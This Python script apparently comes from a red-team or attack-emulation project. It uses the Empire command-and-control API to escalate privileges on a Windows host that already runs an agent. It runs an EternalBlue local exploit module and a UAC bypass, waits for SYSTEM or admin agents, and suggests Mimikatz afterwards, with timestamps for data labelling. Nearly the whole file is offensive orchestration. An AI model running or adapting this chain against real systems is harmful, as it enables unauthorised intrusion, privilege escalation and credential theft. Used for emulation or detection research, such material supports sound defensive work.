""" This example demonstrates procedure scripting
    We aim to make procedure agnostic to techniques which could
    be achieved with Empire, Metasploit or whatever pen-test framework that
    supports APIs. In this case, we use Empire.
"""
import sys, os
from c2_settings import EMPIRE_SERVER, EMPIRE_USER, EMPIRE_PWD
from EmpireAPIWrapper import empireAPI
from autocomplete.empire import privesc
from stage2.external_c2 import empire_wait_for_agent, empire_get_timestamp
from stage3.internal_reconn.windows import empire_is_user_admin
from stage3.escalate_privilege.windows import empire_bypassUAC, empire_localEternalBlue

try: 
    # use a common API context instead of a new instance per technique script
    API = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)
    # we assume there's a non-privilege agent, some stager was executed before
    hostname = 'WIN-7JKBJEGBO38'
    agent = empire_wait_for_agent.run(API, hostname, False, 5)
    admin_type = empire_is_user_admin.run(API, agent['name']) 
    # to assist data labelling, we timestamp with reference to target machine
    timestamp = empire_get_timestamp.run(API, agent['name'])
    print(timestamp + ' starting local EoP') # or log this
    if admin_type is None:
        empire_localEternalBlue.run(API, agent['name'])
        agent = empire_wait_for_agent.run(API, hostname, True, 120)
        if agent is not None:
            print('yeay!!! we got an SYSTEM user')
    empire_bypassUAC.run(API, agent['name'], privesc.bypassuac.path)
    # wait for privileged agent for 120 seconds
    agent = empire_wait_for_agent.run(API, hostname, True, 120)
    if agent is not None:
        print('yeay!!! we got an {0} admin user'.format(admin_type))    
        # you can run Mimikatz or any privilege activities...    
    timestamp = empire_get_timestamp.run(API, agent['name'])
    print(timestamp + ' ended local EoP') # or log this
except Exception as e:
    exc_type, exc_obj, exc_tb = sys.exc_info()
    fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
    print(exc_type, fname, exc_tb.tb_lineno) # provides exact line #
    print("Oops: " + str(e))
